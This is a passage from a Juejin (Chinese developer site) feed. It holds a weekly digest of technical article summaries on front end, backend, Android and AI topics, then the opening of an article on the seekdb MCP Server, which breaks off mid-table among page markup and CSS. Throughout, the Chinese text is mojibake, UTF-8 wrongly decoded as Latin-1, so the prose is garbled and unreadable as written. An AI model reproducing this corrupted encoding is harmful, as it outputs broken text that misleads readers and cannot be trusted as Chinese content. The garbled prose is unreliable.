<p>Tailwind CSSå› åœ¨å‰ç«¯AIä¸­è¢«å¤§é‡ä½¿ç”¨ï¼Œè™½ä½¿ç”¨é‡å¢å¤§ä½†åˆ‡æ–­å…¶åŸæœ¬â€œæµé‡toè½¬åŒ–â€çš„èµšé’±è·¯å¾„ï¼Œå‡ºç°â€œè¶Šç«è¶Šç©·â€æƒ…å†µï¼Œè£æ‰éƒ¨åˆ†å·¥ç¨‹å¸ˆã€‚èµåŠ©ä»…è§£ç‡ƒçœ‰ä¹‹æ€¥ï¼ŒAIå¯¹å¼€æºé¡¹ç›®å½±å“æ‰åˆšå¼€å§‹ï¼Œç›ˆåˆ©æ›´å–å†³äºåœ¨AIé“¾è·¯ä¸­çš„è§’è‰²ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7594731175405633576" target="_blank" title="https://juejin.cn/post/7594731175405633576">é¸¿è’™åº”ç”¨çš„â€œä»»æ„é—¨â€ï¼šDeep Linking ä¸ App Linking çš„ç›¸çˆ±ç›¸æ€</a><a href="https://juejin.cn/user/1591748568287463/posts" target="_blank" title="https://juejin.cn/user/1591748568287463/posts">@SameX</a></p>
<blockquote>
<p>æœ¬æ–‡åŸºäºHarmonyOS Nextï¼Œä»‹ç»äº†é¸¿è’™ç³»ç»Ÿç”¨äºè§£å†³åº”ç”¨è·³è½¬é—®é¢˜çš„Deep Linkingå’ŒApp Linkingã€‚å‰è€…ç”¨è‡ªå®šä¹‰åè®®ï¼Œç®€å•ä½†ä¸å®‰å…¨ï¼›åè€…ç”¨æ ‡å‡†HTTPSï¼Œæ­£è§„å®‰å…¨ã€‚è¿˜ç»™å‡ºå®æˆ˜ä»£ç ï¼Œæœ€åå»ºè®®æ¨å¹¿ç”¨App Linkingï¼Œå†…éƒ¨äº’é€šé€‰Deep Linkingã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7593595780222500870" target="_blank" title="https://juejin.cn/post/7593595780222500870">å‘Šåˆ«æ‰‹å†™ç¤¼ç°¿ï¼ä¸€æ¬¾å¼€æºå…è´¹çš„ç”µå­çº¢ç™½å–œäº‹ç¤¼ç°¿ç³»ç»Ÿï¼</a><a href="https://juejin.cn/user/3958702402176765/posts" target="_blank" title="https://juejin.cn/user/3958702402176765/posts">@Javaé™ˆåºå‘˜</a></p>
<blockquote>
<p>æ–‡ç« æ¨èäº†å¼€æºå…è´¹çš„ç”µå­çº¢ç™½å–œäº‹ç¤¼ç°¿ç³»ç»Ÿ gift - bookï¼Œå®ƒçº¯æœ¬åœ°è¿è¡Œï¼Œæ— éœ€è”ç½‘ã€æ•°æ®åŠ å¯†ã€‚å…·å¤‡ç§’çº§è®°è´¦ã€åŒè‰²ä¸»é¢˜ç­‰ç‰¹è‰²åŠŸèƒ½ã€‚ä»‹ç»äº†å¿«é€Ÿä¸Šæ‰‹ã€æœ¬åœ°å¼€å‘æ­¥éª¤ï¼Œç§°å…¶æ“ä½œç®€å•ã€æ— æ•°æ®æ³„éœ²é£é™©ï¼Œå€¼å¾—ä¸€è¯•ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7593859149441155081" target="_blank" title="https://juejin.cn/post/7593859149441155081">äº§å“å‚¬ï¼š 1 å¤©ä¼˜åŒ– Vue å®˜ç½‘ SEOï¼Ÿæˆ‘ç”¨è¿™ä¸ªæ’ä»¶åŠå¤©æå®šï¼ˆä¸é‡æ„ Nuxtï¼‰</a><a href="https://juejin.cn/user/3035079961218551/posts" target="_blank" title="https://juejin.cn/user/3035079961218551/posts">@ä¸ä¸€æ ·çš„å°‘å¹´_</a></p>
<blockquote>
<p>æ–‡ç« å›´ç»• 1 å¤©å†…ä¼˜åŒ– Vue å®˜ç½‘ SEO å±•å¼€ã€‚å› æ—¶é—´ç´§ã€è¿ç§»æˆæœ¬åŠè¿ç»´é—®é¢˜æœªé€‰ Nuxtï¼Œé‡‡ç”¨ vite - ssg å®ç° SPA åˆ° SSG è½¬å˜ï¼Œè§£å†³ç¯å¢ƒå…¼å®¹ã€æ•°æ®å¡«å……ç­‰éš¾é¢˜ï¼Œæœ€ç»ˆæå‡ SEO è¯„åˆ†ï¼Œæˆæœæ˜¾è‘—ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7593550315254218758" target="_blank" title="https://juejin.cn/post/7593550315254218758">è§†é¢‘æ’­æ”¾å¼±ç½‘æç¤ºå®ç°</a><a href="https://juejin.cn/user/3233040624266695/posts" target="_blank" title="https://juejin.cn/user/3233040624266695/posts">@å¤èŒ—å‰ç«¯å›¢é˜Ÿ</a></p>
<blockquote>
<p>ä¸šåŠ¡åé¦ˆè§†é¢‘æ’­æ”¾å¡é¡¿å¤šå› å¼±ç½‘ï¼Œä¸ºä¼˜åŒ–ä½“éªŒã€å‡å°‘å®¢è¯‰ï¼Œæå‡ºä¸¤ç§æ–¹æ¡ˆï¼šä¸€æ˜¯ç”¨Â <code>NetworkInformation</code>Â åˆ¤æ–­ç½‘ç»œæƒ…å†µï¼ŒäºŒæ˜¯ç›‘å¬Â <code>Video</code>Â å…ƒç´ çš„Â <code>waiting</code>Â å’ŒÂ <code>canplay</code>Â äº‹ä»¶ã€‚è¿˜æ‹“å±•äº†ç½‘ç»œé€Ÿåº¦æ£€æµ‹åŠŸèƒ½ï¼Œæœ€ç»ˆæˆåŠŸå®ç°å¼±ç½‘æç¤ºã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7595472747456348175" target="_blank" title="https://juejin.cn/post/7595472747456348175">ç°ä»£ CSS é¢œè‰²ä½¿ç”¨æŒ‡å—</a><a href="https://juejin.cn/user/712139234359182/posts" target="_blank" title="https://juejin.cn/user/712139234359182/posts">@å†´ç¾½</a></p>
<blockquote>
<p>æœ¬æ–‡ä»‹ç»ç°ä»£ CSS é¢œè‰²ä½¿ç”¨æŠ€å·§ï¼ŒåŒ…æ‹¬ç°ä»£å†™æ³•å¦‚ rgb å¯ç›´æ¥åŠ é€æ˜åº¦ã€ç”¨ç©ºæ ¼åˆ†éš”ï¼›ç›¸å¯¹é¢œè‰²èƒ½åŸºäºç°æœ‰é¢œè‰²ç”Ÿæˆæ–°é¢œè‰²ï¼›æµ…æš—ä¸»é¢˜ç”¨ light - dark åˆ‡æ¢ï¼›æ¸å˜å¯æŒ‡å®šé¢œè‰²ç©ºé—´ï¼›è¿˜èƒ½ä½¿ç”¨è¶…å®½è‰²åŸŸæ»¡è¶³ç‰¹æ®Šéœ€æ±‚ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7594270467029581851" target="_blank" title="https://juejin.cn/post/7594270467029581851">ä¸€ä¸ªçº¯å‰ç«¯çš„ç½‘ç«™é›†åˆç®¡ç†å·¥å…·</a><a href="https://juejin.cn/user/817692381290190/posts" target="_blank" title="https://juejin.cn/user/817692381290190/posts">@Younglina</a></p>
<blockquote>
<p>æœ¬æ–‡ä»‹ç»ä¸€ä¸ªçº¯å‰ç«¯ç½‘ç«™é›†åˆç®¡ç†å·¥å…·ï¼Œæ”¯æŒæœ¬åœ°æ•°æ®å­˜å‚¨ã€å®Œæ•´ CRUD æ“ä½œå’Œ JSON æ•°æ®å¯¼å…¥å¯¼å‡ºï¼Œå¯ä½œ Chrome æ‰©å±•ã€‚å®ƒå…·å¤‡ç½‘ç«™ç®¡ç†ã€å›¾ç‰‡ä¸Šä¼ ç­‰åŠŸèƒ½ï¼Œä½¿ç”¨ Vue 3ã€TypeScript ç­‰æŠ€æœ¯æ ˆï¼Œè¿˜ç»™å‡ºä½¿ç”¨ã€å®‰è£…åŠæ³¨æ„äº‹é¡¹ã€‚</p>
</blockquote>
<h3 data-id="heading-2">åç«¯</h3>
<p><a href="https://juejin.cn/post/7594817135128248354" target="_blank" title="https://juejin.cn/post/7594817135128248354">ä¸ºä»€ä¹ˆJavaé‡Œé¢ï¼ŒService å±‚ä¸ç›´æ¥è¿”å› Result å¯¹è±¡ï¼Ÿ</a><a href="https://juejin.cn/user/1732486058745054/posts" target="_blank" title="https://juejin.cn/user/1732486058745054/posts">@ä¸€åªå«ç…¤çƒçš„çŒ«</a></p>
<blockquote>
<p>æ–‡ç« å›´ç»•Javaé‡ŒServiceå±‚ä¸ç›´æ¥è¿”å›Resultå¯¹è±¡å±•å¼€ã€‚ä»èŒè´£åˆ†ç¦»ã€å¯å¤ç”¨æ€§ã€å¼‚å¸¸å¤„ç†ã€æµ‹è¯•ä¾¿åˆ©æ€§ç­‰å¤šæ–¹é¢é˜è¿°åŸå› ï¼Œå¼ºè°ƒServiceåº”ä¸“æ³¨ä¸šåŠ¡é€»è¾‘ï¼Œé¿å…ä¸è¡¨ç°é€»è¾‘è€¦åˆï¼Œä»¥æå‡ä»£ç è´¨é‡å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7594266018303934527" target="_blank" title="https://juejin.cn/post/7594266018303934527">ç‰©å“è¶…é¢†å–æŸå¤±1ä¸‡äº‹æ•…å¤ç›˜(ä¸€)</a><a href="https://juejin.cn/user/465848660928872/posts" target="_blank" title="https://juejin.cn/user/465848660928872/posts">@æå‰é€€ä¼‘çš„javaçŒ¿</a></p>
<blockquote>
<p>æœ¬æ–‡å›´ç»•ç‰©å“è¶…é¢†å–æŸå¤±1ä¸‡äº‹æ•…å±•å¼€å¤ç›˜ã€‚å…ˆåˆ†ææ ¸å¿ƒä»£ç ï¼Œæ¢è®¨äº‹åŠ¡å¤±æ•ˆã€ä¸»ä»è¯»å†™ä¸ä¸€è‡´é—®é¢˜ï¼›å†å‰–æå¼‚å¸¸æ—¥å¿—ä¸æ•°æ®åº“æ—¥å¿—ï¼›è™½å‘ç°äº‹åŠ¡æŠ¥é”™ã€é˜»å¡ç­‰é—®é¢˜ï¼Œä½†ä»æ— æ³•è§£é‡Šè¶…é¢†åŸå› ï¼Œåç»­å°†è·Ÿè¿›ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7594301878828498982" target="_blank" title="https://juejin.cn/post/7594301878828498982">Spring çš„è¥¿è¥¿å¼—æ–¯ä¹‹çŸ³ï¼šç†è§£ BeanFactoryã€FactoryBean ä¸ ObjectFactory</a><a href="https://juejin.cn/user/3485898277388519/posts" target="_blank" title="https://juejin.cn/user/3485898277388519/posts">@ä¸€æ—…äºº</a></p>
<blockquote>
<p>æ–‡ç« æ·±å…¥å‰–æäº† Spring ä¸­æ˜“æ··æ·†çš„ä¸‰ä¸ªæ¦‚å¿µã€‚BeanFactory æ˜¯å®¹å™¨ï¼Œç®¡ç† Bean ç”Ÿå‘½å‘¨æœŸï¼›FactoryBean æ˜¯ç‰¹æ®Š Beanï¼Œç”¨äºå¤æ‚ Beanï¼›ObjectFactory æ˜¯æ¥å£ï¼Œæä¾›å»¶è¿Ÿè·å–å¯¹è±¡èƒ½åŠ›ã€‚æ¸…æ™°å¯¹æ¯”ä¸‰è€…ï¼ŒåŠ©å¼€å‘è€…ç†è§£ Spring åº•å±‚é€»è¾‘ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7594728203257364514" target="_blank" title="https://juejin.cn/post/7594728203257364514">å·¥ä½œä¸­æœ€å¸¸ç”¨çš„5ç§æœ¬åœ°ç¼“å­˜</a><a href="https://juejin.cn/user/465848661970824/posts" target="_blank" title="https://juejin.cn/user/465848661970824/posts">@è‹ä¸‰è¯´æŠ€æœ¯</a></p>
<blockquote>
<p>æ–‡ç« ä»‹ç»äº†5ç§å¸¸ç”¨æœ¬åœ°ç¼“å­˜æ–¹æ¡ˆã€‚ConcurrentHashMapç®€å•è½»é‡ï¼ŒLRUç¼“å­˜å¯è‡ªåŠ¨æ·˜æ±°ï¼ŒEhcacheåŠŸèƒ½å…¨é¢é€‚åˆä¼ä¸šçº§ï¼ŒCaffeineæ€§èƒ½å“è¶Šï¼ŒGuava Cacheè®¾è®¡ä¼˜é›…ã€‚è¿˜ç»™å‡ºé€‰å‹å»ºè®®ï¼Œå¼ºè°ƒé€‰åˆé€‚æ–¹æ¡ˆæå‡ç³»ç»Ÿæ€§èƒ½ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7595423299061661705" target="_blank" title="https://juejin.cn/post/7595423299061661705">WebSocket åœ¨ Spring Boot ä¸­çš„å®æˆ˜è§£æï¼šå®æ—¶é€šä¿¡çš„æŠ€æœ¯åˆ©å™¨</a><a href="https://juejin.cn/user/729731453429159/posts" target="_blank" title="https://juejin.cn/user/729731453429159/posts">@è‹æ¸¡è‹‡</a></p>
<blockquote>
<p>æ–‡ç« å›´ç»• Spring Boot ä¸­ WebSocket å±•å¼€ï¼Œå…ˆä»‹ç»å…¶è§£å†³ä¼ ç»Ÿé€šä¿¡é«˜å»¶è¿Ÿã€é«˜å¼€é”€é—®é¢˜çš„ä¼˜åŠ¿ï¼Œæ¥ç€é˜è¿°æŠ€æœ¯æ ˆã€æ ¸å¿ƒè¦ç‚¹ï¼Œå¦‚ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€å¿ƒè·³æœºåˆ¶ç­‰ï¼Œè¿˜ç»™å‡ºç›‘æ§ç³»ç»Ÿå®æˆ˜å’Œå…¸å‹åœºæ™¯ï¼ŒæŒ‡å‡ºé€‚ç”¨ä¸ä¸é€‚ç”¨åœºæ™¯ã€‚</p>
</blockquote>
<h3 data-id="heading-3">Android</h3>
<p><a href="https://juejin.cn/post/7594863660280496147" target="_blank" title="https://juejin.cn/post/7594863660280496147">Compose Multiplatform 1.10 Interop views æ–°ç‰¹æ€§ï¼šOverlay å’Œ Autosizing</a><a href="https://juejin.cn/user/817692379985752/posts" target="_blank" title="https://juejin.cn/user/817692379985752/posts">@æ‹çŒ«deå°éƒ­</a></p>
<blockquote>
<p>Compose Multiplatform 1.10 åœ¨ Interop views æœ‰ä¸¤å¤§æ–°ç‰¹æ€§ã€‚Overlay è®© UIKit interop å¯ç½®äº Compose ä¹‹ä¸Šï¼Œæ”¯æŒé€æ˜èƒŒæ™¯ç­‰æ•ˆæœï¼›Autosizing ä½¿ interop view èƒ½è‡ªåŠ¨è°ƒæ•´å°ºå¯¸ï¼Œç®€åŒ–æ··åˆå¼€å‘å¸ƒå±€ï¼Œè€Œ Android å› ç”Ÿæ€èåˆæ— æ­¤å‰²è£‚é—®é¢˜ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7594661351513833507" target="_blank" title="https://juejin.cn/post/7594661351513833507">HarmonyOSä¸‹é¥­èœæ—¶é—´ -- @Monitor</a><a href="https://juejin.cn/user/1283876003519357/posts" target="_blank" title="https://juejin.cn/user/1283876003519357/posts">@çŒ«çŒ«å¤´å•Š</a></p>
<blockquote>
<p>æ–‡ç« èšç„¦ HarmonyOS çš„ @Monitorï¼Œä»‹ç»å…¶åˆ›å»ºä½¿ç”¨æ–¹å¼ä¸è°ƒç”¨é“¾ã€‚è§£é‡Šå¤šä¸ªå±æ€§åŒæ—¶ä¿®æ”¹æ—¶å›è°ƒä»…æ‰§è¡Œä¸€æ¬¡çš„å»é‡æœºåˆ¶ï¼Œæ˜¯é€šè¿‡ Set é›†åˆæ”¶é›†ç›‘æ§å™¨ã€‚è¿˜æŒ‡å‡ºè®¾è®¡è¦ç‚¹ä¸é™åˆ¶ï¼ŒåŠ©å¼€å‘è€…åˆç†è¿ç”¨ã€‚</p>
</blockquote>
<h3 data-id="heading-4">äººå·¥æ™ºèƒ½</h3>
<p><a href="https://juejin.cn/post/7594813727053905954" target="_blank" title="https://juejin.cn/post/7594813727053905954">OpenCode ä¸Šæ‰‹åˆä½“éªŒï¼šä»å®‰è£…åˆ°ä½¿ç”¨</a><a href="https://juejin.cn/user/712139266070296/posts" target="_blank" title="https://juejin.cn/user/712139266070296/posts">@wangruofeng</a></p>
<blockquote>
<p>OpenCode æ˜¯å¼€æº AI ç¼–ç åŠ©æ‰‹ï¼Œæ”¯æŒå¤šå½¢å¼ä½¿ç”¨ï¼Œå†…ç½®å…è´¹æ¨¡å‹ï¼Œå¯æ¥å…¥å¤šç§æœåŠ¡å•†æ¨¡å‹ã€‚å¯ç”¨äºä»£ç åˆ†æã€ç”Ÿæˆç­‰å·¥ä½œã€‚ä»‹ç»äº†å®‰è£…ã€ä½¿ç”¨æ–¹æ³•åŠå‘½ä»¤é€‰é¡¹ï¼Œè¿˜æåŠå¢å¼ºæ’ä»¶ oh - my - opencode çš„åŠŸèƒ½ã€å®‰è£…ä¸ä½¿ç”¨ã€‚</p>
</blockquote>
<h4 data-id="heading-5">æ´»åŠ¨æ—¥å†</h4>













<table><thead><tr><th>æ´»åŠ¨åç§°</th><th>æ´»åŠ¨æ—¶é—´</th></tr></thead><tbody><tr><td><a href="https://juejin.cn/post/7587675443442450472" target="_blank" title="https://juejin.cn/post/7587675443442450472">ğŸ†2025 AI/Vibe Coding å¯¹æˆ‘çš„å½±å“  å¹´ç»ˆå¾æ–‡</a></td><td>2025å¹´12æœˆ26æ—¥-2026å¹´1æœˆ25æ—¥</td></tr></tbody></table>
<h2 data-id="heading-6">ğŸ“– æŠ•ç¨¿ä¸“åŒº</h2>
<blockquote>
<p>å¤§å®¶å¯ä»¥åœ¨è¯„è®ºåŒºæ¨èè®¤ä¸ºä¸é”™çš„æ–‡ç« ï¼Œå¹¶é™„ä¸Šé“¾æ¥å’Œæ¨èç†ç”±ï¼Œæœ‰æœºä¼šå‘ˆç°åœ¨ä¸‹ä¸€æœŸã€‚æ–‡ç« åˆ›å»ºæ—¥æœŸå¿…é¡»åœ¨ä¸‹æœŸæ˜é‡‘ä¸€å‘¨å‘å¸ƒå‰ä¸€å‘¨ä»¥å†…ï¼›å¯ä»¥æ¨èè‡ªå·±çš„æ–‡ç« ã€ä¹Ÿå¯ä»¥æ¨èä»–äººçš„æ–‡ç« ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨è‡ªç„¶è¯­è¨€ç©è½¬ AI åŸç”Ÿæ•°æ®åº“ â€”â€” seekdb MCP Server]]></title>    <link>https://juejin.cn/post/7597776334065336372</link>    <guid>https://juejin.cn/post/7597776334065336372</guid>    <pubDate>2026-01-22T06:47:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597776334065336372" data-draft-id="7597724783649456168" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨è‡ªç„¶è¯­è¨€ç©è½¬ AI åŸç”Ÿæ•°æ®åº“ â€”â€” seekdb MCP Server"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-22T06:47:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è€çºªçš„æŠ€æœ¯å” å—‘å±€"/> <meta itemprop="url" content="https://juejin.cn/user/2394058441104739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨è‡ªç„¶è¯­è¨€ç©è½¬ AI åŸç”Ÿæ•°æ®åº“ â€”â€” seekdb MCP Server
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2394058441104739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è€çºªçš„æŠ€æœ¯å” å—‘å±€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:47:28.000Z" title="Thu Jan 22 2026 06:47:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>å¼•è¨€</strong></h2>
<p>æƒ³è±¡ä¸€ä¸‹ï¼šä½ åªéœ€è¦ç”¨è‡ªç„¶è¯­è¨€æè¿°ä½ çš„éœ€æ±‚ï¼ŒAI å°±èƒ½è‡ªåŠ¨å¸®ä½ å®Œæˆæ•°æ®åº“æ“ä½œ â€”â€” åˆ›å»ºæ–‡æ¡£é›†åˆã€æ’å…¥æ•°æ®ã€æ‰§è¡Œå¤æ‚æŸ¥è¯¢ï¼Œç”šè‡³æ„å»ºä¸€ä¸ªå®Œæ•´çš„çŸ¥è¯†åº“åº”ç”¨ã€‚è¿™ä¸æ˜¯æœªæ¥ï¼Œè€Œæ˜¯ç°åœ¨å°±èƒ½å®ç°çš„èƒ½åŠ›ã€‚</p>
<p><strong>seekdb MCP Server</strong> å°±æ˜¯å®ç°è¿™ä¸€æ„¿æ™¯çš„æ¡¥æ¢ã€‚å®ƒåŸºäº Anthropic æå‡ºçš„ <strong>MCPï¼ˆModel Context Protocolï¼‰åè®®</strong>ï¼Œè®© AI åŠ©æ‰‹èƒ½å¤Ÿç›´æ¥ä¸ seekdb æ•°æ®åº“äº¤äº’ï¼Œå°† "è‡ªç„¶è¯­è¨€" è½¬åŒ–ä¸º "æ•°æ®åº“æ“ä½œ"ã€‚</p>
<p>æœ¬æ–‡å°†å¸¦ä½ ä¸Šæ‰‹ seekdb MCP Serverï¼Œå¹¶é€šè¿‡ä¸€ä¸ªå®æˆ˜æ¡ˆä¾‹ â€”â€” <strong>é€šè¿‡è‡ªç„¶è¯­è¨€æ„å»º AI åº”ç”¨</strong>ï¼Œè®©ä½ äº²èº«ä½“éªŒ AI åŸç”Ÿæ•°æ®åº“çš„é­…åŠ›ã€‚</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2026/png/32756313/1769063761850-22e42807-b0da-4442-95b7-9a12342d990f.png" alt="" loading="lazy"/></p>
<p>æ¬¢è¿å¤§å®¶å…³æ³¨ï¼Œåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä¼šæŒç»­ä¸ºå¤§å®¶æ›´æ–°ä¸ #æ•°æ®åº“ã€#AI ç›¸å…³çš„æŠ€æœ¯å†…å®¹ï¼</p>
<h2 data-id="heading-1"><strong>ä»€ä¹ˆæ˜¯ seekdb MCP Serverï¼Ÿ</strong></h2>
<p><strong>seekdb</strong> æ˜¯ä¸€æ¬¾ AI åŸç”Ÿæœç´¢æ•°æ®åº“ï¼Œåœ¨ç»Ÿä¸€æ¶æ„ä¸‹èåˆäº†å…³ç³»æ•°æ®ã€å‘é‡æ•°æ®ã€å…¨æ–‡ç´¢å¼•ã€JSON å’Œ GIS èƒ½åŠ›ï¼Œæ”¯æŒæ··åˆæ£€ç´¢å’Œåº“å†… AI å·¥ä½œæµã€‚</p>
<p><strong>MCP Server</strong> åˆ™æ˜¯è¿æ¥ AI å·¥å…·ä¸æ•°æ®åº“çš„"é€‚é…å™¨"ã€‚é€šè¿‡ MCP åè®®ï¼ŒCursorã€Claude Codeã€Cline ç­‰ AI å·¥å…·å¯ä»¥ç›´æ¥è®¿é—®å’Œæ“ä½œ seekdb æ•°æ®åº“ã€‚</p>
<h3 data-id="heading-2"><strong>æ ¸å¿ƒèƒ½åŠ›ä¸€è§ˆ</strong></h3>



































<table><thead><tr><th align="left"><strong>èƒ½åŠ›åˆ†ç±»</strong></th><th align="left"><strong>å·¥å…·åˆ—è¡¨</strong></th><th align="left"><strong>åŠŸèƒ½è¯´æ˜</strong></th></tr></thead><tbody><tr><td align="left"><strong>å‘é‡é›†åˆç®¡ç†</strong></td><td align="left"><code>create_collection</code>ã€<code>query_collection</code>ã€<code>add_data_to_collection</code> ç­‰</td><td align="left">åˆ›å»ºå‘é‡é›†åˆã€è¯­ä¹‰æœç´¢ã€æ–‡æ¡£ç®¡ç†</td></tr><tr><td align="left"><strong>é«˜çº§æœç´¢</strong></td><td align="left"><code>full_text_search</code>ã€<code>hybrid_search</code></td><td align="left">å…¨æ–‡æœç´¢ã€æ··åˆæœç´¢ï¼ˆBM25 + å‘é‡ï¼‰</td></tr><tr><td align="left"><strong>AI å‡½æ•°</strong></td><td 